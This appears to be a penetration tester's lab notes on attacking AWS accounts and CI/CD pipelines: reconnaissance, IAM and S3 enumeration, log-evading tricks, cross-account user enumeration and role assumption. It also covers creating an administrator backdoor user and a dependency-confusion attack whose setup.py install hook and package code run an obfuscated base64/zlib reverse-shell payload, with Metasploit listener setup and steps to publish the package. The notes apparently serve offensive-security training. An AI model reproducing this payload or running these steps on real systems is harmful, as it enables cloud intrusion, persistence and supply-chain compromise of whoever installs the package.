
# Enumeration
## Initial Reconnaissance
Domain + Subdomain Enumeration
1) Enumerate authoritative nameservers
	1) `host -t ns example.com`
2) Enumerate who owns the nameservers
	2) `whois awsdns-00.com | grep "Registrant Organization"`
3) Identify IP address of host
	3) `host www.example.com` --> 52.70.117.69
4) Reverse DNS lookup of the IP address
	4) `host 52.70.117.69`
5) Whois on the IP address
	1) `whois 52.70.117.69 | grep "OrgName"`
6) Run dnsenum
	2) `dnsenum example.com --threads 500` (reduce to 100 threads if issues)

## Methodology
1) Create profile
2) Find current user: `aws --profile <profile_name> sts get-caller-identity`
3) List user policies: `aws --profile <profile_name> iam list-user-policies --user-name <username_from_previous_command>`
4) List all S3 buckets in account: `aws --profile <profile_name> s3api list-buckets`
5) Run these
	- List users: `aws --profile <profile_name> iam list-users | tee  users.json`
	- List groups: `aws --profile <profile_name> iam list-groups | tee groups.json`
	- List roles: `aws --profile <profile_name> iam list-roles | tee roles.json`
	- List policies: `aws --profile <profile_name> iam list-policies --scope Local --only-attached | tee policies.json`
6) Look at group names in `less groups.json`
7) For each group name, run to get list of users `aws --profile target iam get-group --group-name "<group_name>"`
	1) Also to get group details `aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='<group_name>']"`
8) For each user in each group, run `aws --profile target iam get-account-authorization-details --filter User Group --query "UserDetailList[?UserName=='clouddesk-yellow']"` to see permissions

## AWS CLI Commands
```bash
aws configure --profile attacker
# AWS Access Key ID
# AWS Secret Key
# Default region `us-east-1`
# Default output format `json`

# Get account info (noisy)
# Returns details about the IAM user or role whose credentiasl were used to call the operation
aws --profile attacker sts get-caller-identity
# Returns the account identifier for the specified access key ID
aws sts get-access-key-info

# Stealthy
aws --profile challenge sts get-access-key-info --access-key-id <target_access_key> # get account info (stealthier: goes into attacker's logs instead of victim's logs)
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile # get AWS Account ID and identity (without generating an event log)

# See command info and arguments
aws ec2 describe-snapshots help

# S3 list all buckets
aws --profile <profile_name> s3api list-buckets
# List contents
aws --profile attacker s3 ls <BUCKET_NAME>
# Copy items from S3 Bucket to Kali
aws s3 cp s3://staticcontent-asdftge3aby2kdab/README.md ./
# Upload/Download in bulk (aws s3 sync SOURCE DESTINATION)
aws s3 sync s3://staticcontent-asdftge3aby2kdab ./static_content/

# See how many users, groups, roles, policies, MFAs there are
aws iam get-account-summary | tee account-summary.json
# Record users to file
aws --profile <profile_name> iam list-users | tee  users.json
# Record groups to file
aws --profile <profile_name> iam list-groups | tee groups.json
# Record roles to file
aws --profile <profile_name> iam list-roles | tee roles.json
# Record policies to file
aws --profile <profile_name> iam list-policies --scope Local --only-attached | tee policies.json # Only those that are Customer-Managed Policies (omit AWS Managed Policies) and only those that are attached to IAM identity
# Record all the above but to a single file
aws --profile <profile_name> iam get-account-authorization-details --filter User Group LocalManagedPolicy Role | tee account-authorization-details.json

# Enumerate groups that a user is in
aws --profile <profile_name> iam get-groups-for-user --username <username>
# Enumerate users in a group
aws --profile <profile_name> iam get-group --group-name <group_name>
# Get all inline policies
list-user-policies
get-user-policy
list-group-policies
get-group-policy
list-role-policies
get-role-policy
# Get all managed policies (i.e., can be attached to multiple identities)
list-attached-user-policies
list-attached-group-policies
list-attached-role-policies
# View policy versions (authorizations)
aws --profile <profile_name> iam list-policy-versions --policy-arn arn:aws:iam::12345678912:policy/deny_challenges_access # This will list versions, follow-up this command with get-policy-version; for details
aws --profile <profile_name> iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"
# The above policy enumeration may be blocked; try with this instead:
aws --profile <profile_name> iam get-account-authorization-details --filter LocalManagedPolicy

# List single user by their `<username>`
aws --profile <profile_name> iam get-account-authorization-details --filter User Group --query "UserDetailList[?UserName=='<username>']"
# List every user with `admin` somewhere in the name
aws --profile <profile_name> iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"
# List single group by their `<groupname>`
aws --profile <profile_name> iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='<groupname>']"
# List every group with `/admin/` in their Path key
aws --profile <profile_name> iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"

# Get policies for a group <group_name>
aws --profile <profile_name> iam get-account-authorization-details --filter LocalManagedPolicy --query "Policies[?PolicyName=='<group_name>']"

# Enumerate EC2 instances
aws --profile <profile_name> ec2 describe-instances

# Enumerate AMI images
aws --profile attacker ec2 describe-images --owners amazon --executable-users all
# Enumerate AMI images (filter on interesting keywords)
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Examplelab*"

# Enumerate publicly-shared EBS snapshots
aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*examplelab*"
# Enumerate publicly-shared EBS snapshots (multiple filters)
aws --profile attacker ec2 describe-snapshots --filters "Name=volume-size,Values=1" "Name=owner-id,Values=672775249431"

# Check other regions (--region)
aws --profile target sts get-caller-identity --region us-east-2

# Assume a role (follow-up with configuring a new AWS CLI profile from the returned Access Keys; see dedicated section below for more info)
aws sts assume-role --role-arn "arn:aws:iam::672775249431:role/orange-lab_admin" --role-session-name "PwnSession" --profile attacker
```
- **Identity**: an IAM resource that can be authorized to perform actions and access resources; identities include users, groups, and roles.
	- In AWS, policies can be associated to an identity via Inline Policies or Managed Policies
		- **Inline Policy**: directly linked to a single identity and exist only in that identity space
			- Enumerate via `aws --profile <profile-name> iam list-user-policies --user-name <user-name>`
		- **Managed Policies**: stand as distinct, reusable policies that can be associated with multiple identities
			- Enumerate via `aws --profile <profile-name> iam list-attached-user-policies --user-name <user-name>`
	- Identities can also be in Groups; the group's policies will apply
		- 1) Enumerate group membership `aws --profile target iam list-groups-for-user --user-name clouddesk-yellow`
		- 2) Enumerate group inline policies
			- `aws --profile <profile-name> iam list-group-policies --group-name <group-name>`
		- 3) Enumerate group managed policies
			- `aws --profile <profile-name> iam list-attached-group-policies --group-name <group-name>`
- Policies
	- Note the ARN of a policy from the commands above, then enumerate with
		- `aws --profile <profile-name> iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"` (replace ARN example)
			- This will show versions of policies. Take note of the most recent version.
	- View policy: `aws --profile <profile-name> iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8`
		- Replace ARN and version-id

## Pacu
- `run iam__bruteforce_permissions` to enumerate IAM permissions for this profile
	- For a specific service: `iam__bruteforce_permissions -services <comma-separated list of services>`
- `run iam__enum_uers_roles_policies_groups`
	- Roughly equivalent to `get-account-authorization-details`
	- Must follow up by running
		- `services` (lists services)
		- Then,  `data <service_name>`
- `swap_keys` to change currently active AWS key to another key that has been previously set for this session

## AWS CLI: Policy Enumeration
There are three ways an administrator may attach a policy to a user:
1. **Inline Policy**: Policy made only for a single user account and attached directly.
	1. `aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin`
2. **Managed Policy Attached to User:** Customer- or AWS-managed policy attached to one or more users.
	2. `aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin`
3. **Group Attached Policy**: Inline or Managed Policy attached to a group, which is assigned to the user.
	1. `aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin`

View Inline-Policy in more detail (similar command for Managed Policies and Group-Attached Policies)
```bash
aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
```

## Create Backdoor User
```bash
# Create user
aws --profile CompromisedJenkins iam create-user --user-name backdoor

# Give AdministratorAccess policy
aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key
aws --profile CompromisedJenkins iam create-access-key --user-name backdoor

# Create profile for user with new "backdoor" identity
aws configure --profile=backdoor
```

## JMESPath Filtering
`aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].{Name: UserName,Path: Path,Groups: GroupList}"`
- The keys in the above JMES dictionary (i.e., `Name`, `Path`, `Groups` are just what we want to call them, they can be meaningless. It is what will show up in the formatted output)

List single user by their `<username>`:
```bash
aws --profile <profile_name> iam get-account-authorization-details --filter User Group --query "UserDetailList[?UserName=='<username>']"
```
List every user with `admin` somewhere in the name:
```bash
aws --profile <profile_name> iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"
```
List single group by their `<groupname>`:
```bash
aws --profile <profile_name> iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='<groupname>']"
```
List every group with `/admin/` in their Path key:
```bash
aws --profile <profile_name> iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"
```

JMESPath expression that filters and displays all users that contain the word "admin" in the Username and the Path fields
- `?contains(Username,'admin') && contains(Path,'admin')`
- E.g., `aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName,'admin') && contains(Path,'admin')]"`

## S3 Buckets
> ***S3 buckets are commonly misconfigured so that the bucket ACL blocks public access, but allows access to any AWS authenticated user, even if they're in a different AWS account.*** This is because the name of this policy is **AuthenticatedUsers**, which many system administrators confuse with authenticated users in their AWS account.

- Look at URL for S3 bucket name
- `https://s3.amazonaws.com/examplelab-assets-public-wvedtaxi/sites/www/images/orange.png`
	- We can identify the name of the S3 bucket by looking at the first resource in the subpath `examplelab-assets-public-wvedtaxi`
	- The `object key` is the rest of the path `sites/www/images/orange.png`
- Navigate to the bucket name (e.g., `https:s3.amazonaws.com/examplelab-assets-public-wvedtaxi/sites/www/images/orange.png`) and check permissions
	- Maybe it is leaking all object keys
- `cloudbrute` or `cloud-enum` tools
	1) `cloud_enum -k examplelab-assets-public-wvedtaxi --quickscan --disable-azure --disable-gcp`
	2) Make a custom keyfile then run it with `cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp`

```bash
# List all buckets
aws --profile <profile_name> s3api list-buckets
# List contents
aws --profile attacker s3 ls <BUCKET_NAME>
# Copy items from S3 Bucket to Kali
aws s3 cp s3://staticcontent-asdftge3aby2kdab/README.md ./
# Upload/Download in bulk (aws s3 sync SOURCE DESTINATION)
aws s3 sync s3://staticcontent-asdftge3aby2kdab ./static_content/
```

## Leaking AWS Account ID via AWS Objects
**Amazon API will leak the `OwnerId` of an AWS object. Create a user and set a policy that only allows read if the `OwnerId` of the bucket starts with digit `x`; continue iterating through all other digits.** 

Steps:
1) Get bucket name
	1) E.g., By retrieving it from the URL of any image on the website using the `curl` command.
2) List bucket contents:  `aws --profile attacker s3 ls <BUCKET_NAME>`
3) Create `iam` user in your own AWS account
	1) `aws --profile attacker iam create-user --user-name enum`
4) Create access-key and secret-key
	2) `aws --profile attacker iam create-access-key --user-name enum`
5) Create a profile so we can interact as the new IAM user
	1) `aws configure --profile enum` (use access & secret keys from step above)
	2) Verify working with `aws sts get-caller-identity --profile enum`
6) Create policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {
                    "s3:ResourceAccount": ["0*"]
                }
            }
        }
    ]
}
```
7) Apply policy
```bash
aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json
```
8) Verify policy applied
	1) `aws --profile attacker iam list-user-policies --user-name enum`
9) Attempt access to AWS resource
	2) `aws --profile enum s3 ls examplelab-assets-private-farpeers`
10) Change ResourceAccount `"0*"` to `"1*"` in step 6 above and iterate

## Leaking IAM Users in Other AWS Accounts
**AWS will leak IAM users in other accounts. When you try to "cross-configure" allowing permissions to objects in your AWS account for the target's AWS account, AWS leaks whether the user exists (policy applied successfully) or not.**

Steps:
*Prerequisites: we must know the AWS account ID already*
1) Create an S3 Bucket in the attacker's account
	1) `aws --profile attacker s3 mb s3://examplelab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM`
2) Create policy (we will be modifying the username `cloudadmin`, do **NOT** modify the AWS account ID `123456789012`)
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::examplelab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}
```
3) Attempt to apply it; success indicates user exists
	1) `aws --profile attacker s3api put-bucket-policy --bucket examplelab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json`
4) Try this list of users
```
lab_admin
security_auditor
content_creator
student_access
lab_builder
instructor
network_config
monitoring_logging
backup_restore
content_editor
```

Automatic Steps (Pacu):
*Prerequisites: we must know the AWS account ID already*
1) `pacu`
2) Create session: `examplelab`
3) `import_keys <profile_name>` (e.g., `import_keys attacker`)
4) `ls` in Pacu to view available modules
5) `help <module>` (e.g., `help iam__enum_roles`) to display more info
6) `run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012`

## Assume an AWS role
1) Assume the role
`aws sts assume-role --role-arn "arn:aws:iam::672775249431:role/orange-lab_admin" --role-session-name "PwnSession" --profile attacker`
- `--role-session-name` doesn't matter
- Replace AWS account ID (currently `672775249431`) and the name of the role (currently `orange-lab_admin`) and the profile name (currently `attacker`)
2) Note the AccessKeyId, SecretAccessKey, and SessionToken from above step, and export them as environment variables
```
aws configure set aws_access_key_id <AWS_ACCESS_KEY> --profile attacker
aws configure set aws_secret_access_key <AWS_SECRET_ACCESS_KEY> --profile attacker
aws configure set aws_session_token <AWS_SESSION_TOKEN> --profile attacker
```
3) Do whatever commands you need
	1) e.g., describe all VPCs: `aws ec2 describe-vpcs --query "Vpcs[*].VpcId" --profile attacker`

All-in-One (not tested)
- Replace the `ACCOUNT_ID` and role name (currently `orange-lab_admin`)
```
eval $(aws sts assume-role --role-arn "arn:aws:iam::ACCOUNT_ID:role/orange-lab_admin" --role-session-name "PwnSession" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text | awk '{print "export AWS_ACCESS_KEY_ID="$1" AWS_SECRET_ACCESS_KEY="$2" AWS_SESSION_TOKEN="$3}')
```

## Git / Jenkins (CI/CD) Basics
```bash
git log # view history
git show HEAD~0 # view diff
git show <COMMIT_HASH>
```
- SCMs (like Gitea) have webhooks for calling out to automation like Jenkins

Do not write reverse shell in Jenkins's native Groovy language because it will run in a very limited sandbox
	- Jenkins may also require additional approval from administrators if using internal APIs
- Very basic Linux enumeration
	- `history`
	- `uname -a`
	- `cat /etc/os-release`
	- `ipconfig` and `ip a`
- Linux container enumeration
	- `cat /proc/mounts`
	- `cat /proc/1/status | grep Cap`
		- Take the output of "capEff" (e.g., `0000003fffffffff`) and run
			- `capsh --decode=0000003fffffffff` to view capabilities

## Publishing Malicious Packages (CI/CD)
- Package managers can get confused on which package to choose if the same named package is available from multiple indexes
	- Python's pip will look at the main public index (`index-url`) but also look at any extras (`extra-index-url`). If the same named package exists in both, it will choose the one with the highest version that matches the criteria
- We'll also need to match the versioning being requested by the target application. **Each package manager handles the version request differently, but below are some examples of various pip version specifiers:**
	- `==`: This is the version matching clause. For example, if the requested package is `some-package==1.0.0`, only the 1.0.0 version would be downloaded. It's important to mention that wildcards can be used, so `some-package==1.0.*` would also match 1.0.0, 1.0.1, and so on.
	- `<=`: This the version matching clause that would match any version equal or less than the specified version. For example, if `some-package<=1.0.0` was requested, versions 1.0.0, 0.0.9, and 0.8.9 would match, but 1.0.1 and 7.0.2 would not.
	- `>=`: This the version matching clause that would match any version equal or greater than the specified version. This is the opposite of the `<=` clause.
	- `~=`: This is the compatible release clause, which will download any version that should be compatible with the requested version. This assumes that the developer versions the package according to the specification. For example, if `some-package~=1.0.0` is requested, 1.0.1, 1.0.5, and 1.0.9 would all match, but 1.2.0 and 2.0.0 would not.

- Important distinction between builder servers and runtime servers:
	- Editing setup.py (`class Installer(install)`) can give you RCE on the builder. This is code that will run on the builder.
	- The malicious Python package that is eventually built and run will give you RCE in the runtime (production server)

Python package creation
0) Set custom index server in `~/.config/pip/pip.config`
```
[global]
index-url = http://pypi.example.com
trusted-host = pypi.example.com
```
0) Create directory structure
```
└── hackshort-util
    ├── setup.py
    └── hackshort_util
        └── __init__.py
```
2) Create setup.py (can give RCE on build server)
	1) Can also use `pyproject.toml` or `setup.cfg`
```Python
# Example with reverse shell execution in the Installer (targeting the Build Server)
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)
        exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/orckGMNWs2tdrCDiQUQE15uItMmooWkSkqxWxf++G7J4meG9efPmQ0/ehVRHJ0dI7MfogQ19hJVgMYWtTCzpCdCbC/Vca1uH3r4DaRZ0jaoUvvexil1p5iWRE3bAm4fru9fN0+PN1T3NOi6dtSATIXgpeHvKG9Hw5vwMMyHalmbNEKAfUQWzBJ+yeZ7OowHwZEmR6cpSfGt9L0eCL28xizyA/CSC0ufFC1LdARuKvj60gdqAJYpemL2dOvqvHheaIphBknw3VyDd5APESMoL+LASmVSQlewXR7yOfxTtACnDX0E=')[0])))


setup(
    name='hackshort-util',
    version='1.1.4',
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
    cmdclass={'install': Installer},
)
```
3) Create malicious package (can give RCE on production server)
```Python
# Example with reverse shell execution in the package (targeting the Production Server)
import time
import sys

def standardFunction():
    pass

# Special function that will catch all function names and redirect to `StandardFunction`
def __getattr__(name):
    pass
    return standardFunction

def catch_exception(exc_type, exc_value, tb):
    while True:
        time.sleep(1000)

# Catch all execptions with `catch_exception` function
sys.excepthook = catch_exception

exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/orckGMNWs2tdrCDiQUQE15uItMmooWkSkqxWxf++G7J4meG9efPmQ0/ehVRHJ0dI7MfogQ19hJVgMYWtTCzpCdCbC/Vca1uH3r4DaRZ0jaoUvvexil1p5iWRE3bAm4fru9fN0+PN1T3NOi6dtSATIXgpeHvKG9Hw5vwMMyHalmbNEKAfUQWzBJ+yeZ7OowHwZEmR6cpSfGt9L0eCL28xizyA/CSC0ufFC1LdARuKvj60gdqAJYpemL2dOvqvHheaIphBknw3VyDd5APESMoL+LASmVSQlewXR7yOfxTtACnDX0E=')[0])))
```
4) Test locally by building and/or importing (will need a Python3 environment for the project)
	1) `python3 ./setup.py sdist` (output in `dist` directory)
	2) `pip install ./dist/hackshort-util-1.1.4.tar.gz`
	3) Open `python3` and `from hackshort_util import utils` and `utils.test()`
	4) ***Note**: If you have a reverse shell in `setup.py`, the `pip install` will hang and open a reverse session*
	5) ***Note**: If you have a reverse shell in the package, importing the package in the Python runtime will hang and open a reverse shell*
5) Start reverse handler in `msfconsole` (assuming we had a Meterpreter payload)
	1) `msfconsole`
	2) `use exploit/multi/handler`
	3) `set payload python/meterpreter/reverse_tcp` (adjust as needed)
	4) `set LHOST 0.0.0.0`
	5) `set LPORT 4488`
	6) `set ExitOnSession false`
	7) `run -jz`
6) Publish malware to index
	6) `python3 setup.py sdist upload -r examplelab`
	7) Before running the step above, ensure to update your `~/.pypirc`:
```
[distutils]
index-servers =
        examplelab

[examplelab]
repository: http://pypi.example.com/
username: student
password: password
```
7) If necessary, remove bad package from index:
	4) `curl -u "student:password" --form ":action=remove_pkg" --form "name=hackshort-util" --form "version=1.1.4" http://pypi.examplelab.com/`
